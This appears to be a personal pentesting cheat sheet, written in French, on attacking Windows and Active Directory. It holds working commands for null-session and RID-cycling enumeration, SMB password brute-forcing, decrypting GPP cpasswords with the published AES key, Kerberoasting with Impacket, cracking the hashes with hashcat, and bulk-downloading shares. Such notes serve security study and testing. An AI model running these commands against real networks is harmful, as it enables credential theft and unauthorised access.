# Windows

- [PowerShell](#powershell)
- [Enumération](#enumération)
- [Mots de passe](#mots-de-passe)
  - [Mot de passe dans SYSVOL](#mot-de-passe-dans-sysvol)
  - [Kerberoast](#kerberoast)
- [Partage](#partage)
- [Liens utiles](#liens-utiles)

---

> *In case of doubt, reboot*, Rowan Atkinson

## PowerShell

```powershell
# afficher en arborescence
tree /f

# lien symbolique
new-item -itemtype symboliclink -path . -name settings.json -value "C:\Users\Kamil\OneDrive\Windows Terminal\settings.json"
```

## Enumération

Pour obtenir des informations sur un domaine :
```bash
# null session
enum4linux -a 192.168.10.1 > enum1.txt
# énumérer les utilisateurs avec un RID cycling sur un intervalle plus grand
enum4linux -U -R 500-2000 192.168.10.1 | grep -v unknown > enum2.txt
# avec des credentials
enum4linux -u test -p test -a 192.168.10.1 > enum_as_test.txt
```

## Mots de passe

Pour se connecter en local et pas sur le domaine : `.\username`

Bruteforce sur le réseau (pas du tout discret) :
```bash
hydra -L usernames.txt -P rockyou.txt 192.168.10.1 smb
```

### Mot de passe dans SYSVOL

Pour déchiffrer le cpassword d'un compte défini dans une GPO sur un partage :
- utiliser la recette [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)AES_Decrypt(%7B'option':'Hex','string':'4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'%7D,%7B'option':'Hex','string':'00000000000000000000000000000000'%7D,'CBC','Raw','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D))
- ou [gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) si besoin offline

Clé AES256 donnée par [Microsoft](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be) :
```bash
# AES256 cipher key
4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8 f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
# Initialisation Vector
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Source : https://adsecurity.org/?p=2288

### Kerberoast

Avec [Impacket](https://github.com/SecureAuthCorp/impacket) :
```bash
python3 ./GetUserSPNs.py -request -dc-ip 192.168.10.1 MIDGAR.LAN/scarlet:password -outputfile kerberoast.hash
```

Pour casser ces hash :
```bash
hashcat -m 13100 -a 0 kerberoast.hash rockyou.txt -o output.txt
```

## Partage

Pour récupérer tous les fichiers d'un partage, et les étudier en local :
```powershell
smb: \> recurse
smb: \> prompt
smb: \> mget *
```

## Liens utiles

https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet

https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/

https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html

Pentesting Active Directory mindmap : https://www.xmind.net/m/5dypm8/
